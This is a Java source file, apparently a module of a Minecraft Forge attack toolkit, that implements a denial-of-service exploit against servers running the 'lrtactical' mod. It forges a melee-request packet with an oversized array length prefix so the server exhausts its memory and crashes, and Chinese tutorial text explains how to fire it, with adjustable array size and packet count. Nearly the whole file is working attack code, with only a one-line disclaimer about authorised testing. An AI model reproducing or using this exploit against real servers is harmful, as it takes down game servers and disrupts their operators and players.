package com.redblue.red.modules.lrtactical;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LRT-02: OOM DoS via unbounded VarIntArray.
 * Sends CMeleeAttackRequest with a massive array length prefix.
 * Server allocates int[] before handler checks size limit -> OutOfMemoryError.
 */
public class LRT02_DoS implements AttackModule {

    private static final ResourceLocation CHANNEL = new ResourceLocation("lrtactical", "network");
    private static final int IDX_MELEE_REQUEST = 4;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("array_size", "数组长度", 10000000, 1000000, 2000000000),
        ConfigParam.ofInt("packet_count", "发包数量", 1, 1, 10)
    );

    @Override public String id() { return "lrt02_dos"; }
    @Override public String name() { return "内存溢出攻击"; }
    @Override public String description() { return "发送超大数组导致服务器内存溢出"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 启用模块\n"
            + "2. 点击「执行」发送攻击包\n"
            + "3. 这是一次性攻击，不需要 tick 循环\n\n"
            + "[参数说明]\n"
            + "数组长度：伪造的数组长度前缀，越大消耗服务器内存越多\n"
            + "发包数量：同时发送的包数量，多个包叠加效果更强\n\n"
            + "[注意事项]\n"
            + "⚠ 这是破坏性攻击，可能导致服务器崩溃\n"
            + "仅用于安全测试，请确保有服务器管理员授权";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("lrtactical");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        int arraySize = getParam("array_size").map(ConfigParam::getInt).orElse(100000000);
        int count = getParam("packet_count").map(ConfigParam::getInt).orElse(1);

        for (int i = 0; i < count; i++) {
            PacketForge.send(CHANNEL, buf -> {
                buf.writeByte(IDX_MELEE_REQUEST);
                buf.writeVarInt(0);          // MeleeAction.LEFT
                buf.writeVarInt(arraySize);  // huge length prefix
                // Don't write actual array data - server will try to allocate
                // based on length prefix alone, then fail reading or OOM
            });
        }
    }
}
